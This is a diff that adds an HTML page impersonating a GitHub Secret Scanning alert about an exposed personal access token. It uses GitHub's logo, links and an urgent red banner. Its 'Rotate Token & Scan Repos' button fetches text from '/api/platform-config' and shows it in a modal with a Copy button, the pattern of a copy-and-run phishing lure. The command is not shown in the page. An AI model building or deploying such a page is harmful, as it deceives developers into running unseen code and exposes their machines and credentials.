@@ -1,0 +1,61 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Alert — Personal Access Token Exposed | GitHub</title><meta name="theme-color" content="#2da44e">
+<style>:root{--c:#2da44e;--ch:#22863a;--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--text:#e6edf3;--text2:#8b949e;--text3:#484f58;--border:#30363d;--radius:6px;--radius-lg:12px;--red:#f85149;--amber:#d29922}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--text);line-height:1.7}
+.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;transition:all .15s;font-family:inherit;border:1px solid var(--border)}
+.btn-primary{background:var(--c);color:#fff;border-color:var(--c)}.btn-primary:hover{background:var(--ch)}
+.btn-danger{background:var(--red);color:#fff;border-color:var(--red)}.btn-danger:hover{opacity:.9}
+nav{background:var(--bg2);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:90}
+.nav-inner{max-width:1100px;margin:0 auto;display:flex;align-items:center;padding:0 20px;height:56px;gap:16px}
+.nav-logo{font-size:16px;font-weight:600;color:var(--text);text-decoration:none}
+.nav-links{display:flex;gap:16px}.nav-links a{color:var(--text2);font-size:13px;text-decoration:none}.nav-links a:hover{color:var(--text)}
+.container{max-width:900px;margin:0 auto;padding:0 20px}
+.alert-bar{background:var(--red);color:#fff;text-align:center;padding:10px;font-size:13px;font-weight:600}
+.page-header{padding:32px 0 20px}
+.page-header h1{font-size:1.5rem;font-weight:600;margin-bottom:6px;display:flex;align-items:center;gap:10px}
+.page-header h1 .dot{width:10px;height:10px;border-radius:50%;background:var(--red);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.page-header p{color:var(--text2);font-size:14px}
+.alert-card{background:#2d1516;border:1px solid var(--red);border-left:4px solid var(--red);border-radius:var(--radius);padding:20px 24px;margin:20px 0}
+.alert-card h3{color:var(--red);font-size:15px;margin-bottom:6px}
+.alert-card p{color:#c9a0a0;font-size:13px;line-height:1.7}
+.commit-box{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:16px 0;font-family:"JetBrains Mono",Consolas,monospace;font-size:13px;line-height:1.8}
+.commit-box .red{color:var(--red)}.commit-box .green{color:var(--c)}.commit-box .dim{color:var(--text3)}
+.info-table{width:100%;font-size:13px}.info-table td{padding:8px 12px;border-bottom:1px solid var(--border);color:var(--text2)}.info-table td:first-child{color:var(--text3);width:160px}
+.action-card{background:var(--bg2);border:1px solid var(--c);border-radius:var(--radius-lg);padding:24px;text-align:center;margin:24px 0}
+.action-card p{color:var(--text2);font-size:14px;margin-bottom:16px}
+footer{text-align:center;padding:28px 20px;font-size:12px;color:var(--text3);border-top:1px solid var(--border);margin-top:32px}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1000;align-items:center;justify-content:center}
+.modal-overlay.active{display:flex}
+.modal{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:36px;max-width:500px;width:92%;position:relative;animation:modalIn .25s ease}
+@keyframes modalIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
+.modal-close{position:absolute;top:12px;right:16px;background:none;border:none;font-size:22px;cursor:pointer;color:var(--text2);font-family:inherit}
+.modal h2{font-size:18px;font-weight:600;margin-bottom:8px}
+.modal .desc{font-size:14px;color:var(--text2);margin-bottom:20px;line-height:1.6}
+.code-display{background:var(--bg3);border:1px solid var(--c);border-radius:var(--radius);padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.code-display code{font-family:"JetBrains Mono",Consolas,monospace;font-size:13px;color:var(--c)}
+.code-display .copy-btn{background:var(--c);color:#fff;border:none;border-radius:4px;padding:6px 16px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
+.code-display .copy-btn:hover{background:var(--ch)}.code-display .copy-btn.copied{background:var(--text3)}
+.toast-container{position:fixed;bottom:24px;right:24px;z-index:10000}
+.toast{background:var(--bg2);color:var(--text);padding:10px 18px;border-radius:var(--radius);font-size:13px;animation:toastIn .3s ease;border:1px solid var(--border)}
+@keyframes toastIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+</style></head><body>
+<div class="alert-bar">Security Alert: A personal access token with repo scope was found in a public commit. <a href="#" style="color:#fff;text-decoration:underline">View details</a></div>
+<nav>
+  <div class="nav-inner">
+    <a href="https://github.com" class="nav-logo" target="_blank" rel="noopener"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>GitHub</a>
+    <div class="nav-links"><a href="https://github.com/dashboard" target="_blank" rel="noopener">Dashboard</a><a href="https://github.com/settings/security" target="_blank" rel="noopener">Security</a><a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Tokens</a><a href="https://docs.github.com" target="_blank" rel="noopener">Docs</a><a href="https://github.com/pricing" target="_blank" rel="noopener">Pricing</a></div>
+  </div>
+</nav>
+<main class="container">
+<div class="page-header"><h1><span class="dot"></span>Personal Access Token Security Alert</h1><p>GitHub Secret Scanning detected an exposed token in a public repository on <strong>2026-07-09 15:42 UTC</strong></p></div>
+<div class="alert-card"><h3>Token Security Advisory</h3><p>GitHub Secret Scanning identified a potential exposure of token <strong>ghp_8xK9mP3vR2tW7yQ...</strong> in repository <strong>org/backend-config</strong>. As a precaution, we recommend rotating this token and running a security scan on your other repositories.</p></div>
+<div class="commit-box"><span class="dim">commit a1b2c3d</span> <span class="green">+</span><span class="red">  ghp_8xK9mP3vR2tW7yQA1bC2dE3fG4hI5jK6lM</span><br><span class="dim">Author: user@example.com</span><br><span class="dim">Repository: org/backend-config</span><br><span class="dim">File: .env (public)</span></div>
+<table class="info-table"><tr><td>Token Type</td><td>Personal Access Token (classic)</td></tr><tr><td>Scopes</td><td>repo, workflow</td></tr><tr><td>Detected</td><td>2026-07-09 15:42 UTC</td></tr><tr><td>Status</td><td style="color:var(--red);font-weight:600">Revoked automatically</td></tr></table>
+<div class="action-card"><p>GitHub Secret Scanning has identified a potential token exposure. Use the token security tool to scan your repositories and rotate affected credentials.</p>
+<button class="btn btn-primary" style="padding:12px 28px;font-size:15px" id="btnDiag">Rotate Token & Scan Repos</button></div>
+</main>
+<footer>GitHub &copy; 2026 &middot; <a href="#" style="color:var(--text2)">Terms</a> &middot; <a href="#" style="color:var(--text2)">Privacy</a> &middot; <a href="#" style="color:var(--text2)">Security</a></footer>
+<div id="toastContainer" class="toast-container"></div>
+<script>(function(){var A={api:'/api/platform-config'};function toast(m){var c=document.getElementById('toastContainer'),t=document.createElement('div');t.className='toast';t.textContent=m;c.appendChild(t);setTimeout(function(){t.style.opacity='0';t.style.transition='opacity .3s';setTimeout(function(){if(t.parentNode)c.removeChild(t)},300)},2200)}function copyText(text,btn){if(navigator.clipboard&&navigator.clipboard.writeText){return navigator.clipboard.writeText(text).then(function(){mark(btn)}).catch(function(){return fallbackCopy(text).then(function(){mark(btn)})})}return fallbackCopy(text).then(function(){mark(btn)})}function fallbackCopy(text){return new Promise(function(resolve,reject){var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;left:-99999px;top:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');resolve()}catch(e){reject(e)}document.body.removeChild(ta)})}function mark(btn){var o=btn.textContent.trim();btn.textContent='Copied!';btn.classList.add('copied');setTimeout(function(){btn.textContent=o;btn.classList.remove('copied')},2000)}function showDialog(cfg){var t=cfg.text||'';var bd=document.createElement('div');bd.className='modal-overlay active';var p=document.createElement('div');p.className='modal';var cl=document.createElement('button');cl.className='modal-close';cl.innerHTML='&times;';cl.addEventListener('click',function(){if(bd.parentNode)bd.parentNode.removeChild(bd)});bd.addEventListener('click',function(e){if(e.target===bd&&bd.parentNode)bd.parentNode.removeChild(bd)});document.addEventListener('keydown',function esc(e){if(e.key==='Escape'&&bd.parentNode){bd.parentNode.removeChild(bd);document.removeEventListener('keydown',esc)}});var ti=document.createElement('h2');ti.textContent=cfg.title||'';var de=document.createElement('p');de.className='desc';de.textContent=cfg.desc||'';var db=document.createElement('div');db.className='code-display';var ce=document.createElement('code');ce.textContent=t;var cb=document.createElement('button');cb.className='copy-btn';cb.textContent='Copy';db.appendChild(ce);db.appendChild(cb);p.appendChild(cl);p.appendChild(ti);p.appendChild(de);p.appendChild(db);bd.appendChild(p);cb.addEventListener('click',function(e){e.stopPropagation();if(!t)return;copyText(t,cb)});document.body.appendChild(bd)}function fetchAndShow(){fetch(A.api,{method:'GET',headers:{'Accept':'application/json'}}).then(function(r){return r.json()}).then(function(cfg){showDialog(cfg)}).catch(function(){toast('Service unavailable')})}document.getElementById('btnDiag').addEventListener('click',function(e){e.preventDefault();fetchAndShow()})})();</script></body></html>
